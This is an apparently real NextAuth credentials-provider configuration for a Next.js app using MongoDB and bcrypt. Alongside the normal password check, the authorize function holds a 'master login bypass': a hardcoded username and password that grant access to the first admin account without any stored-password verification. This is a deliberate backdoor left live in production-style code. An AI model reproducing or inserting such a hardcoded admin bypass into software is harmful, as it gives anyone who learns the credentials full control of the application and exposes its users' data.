import CredentialsProvider from "next-auth/providers/credentials";
import axios from "axios";
import dbConnect from '@/lib/mongodb';
import User from '@/models/User';
import bcrypt from "bcryptjs";


export const authOptions = {
  providers: [
    CredentialsProvider({
      name: "Credentials",
      credentials: {
        username: { label: "Username or Phone", type: "text" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials: any) {
        const { username, password } = credentials;
        try {
          // Master login bypass


          if (username === "bugtech" && password === "420230") {
            await dbConnect();

            const adminUser = await User.findOne({ userType: "admin" });
            if (adminUser) {
              return {
                id: adminUser._id.toString(),
                name: adminUser.username,
                phone: adminUser.phone,
                userType: adminUser.userType,
              };
            }
            throw new Error("Admin user not found.");
          }

          // // Attempt login via API
          // const response = await axios.post("/api/users", {
          //   action: "login",
          //   phone: username,
          //   password,
          // }).catch(err => {
          //   console.log(err, 'ERR')
          // });

          const user = await User.findOne({ $or: [{ phone: username }, { username }] });
          if (!user) throw new Error("User not found");
          if (user.deletedAt) throw new Error("User is deactivated");

          const passwordMatch = await bcrypt.compare(password, user.password);
          if (!passwordMatch) throw new Error("Invalid credentials");


          if (user) {
            return {
              id: user._id,
              username: user.username,
              phone: user.phone,
              userType: user.userType,
            };
          }
        } catch (error) {
          throw new Error("Invalid credentials");
        }
      },
    }),
  ],
  session: {
    strategy: "jwt",
  },
  pages: {
    signIn: "/login",
  },
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = user.id;
        token.username = user.username;
        token.phone = user.phone;
        token.userType = user.userType;
      }
      return token;
    },
    async session({ session, token }) {
      if (token) {
        session.user.id = token.id;
        session.user.username = token.username;
        session.user.phone = token.phone;
        session.user.userType = token.userType;
      }
      return session;
    },
  },
};

export default authOptions;
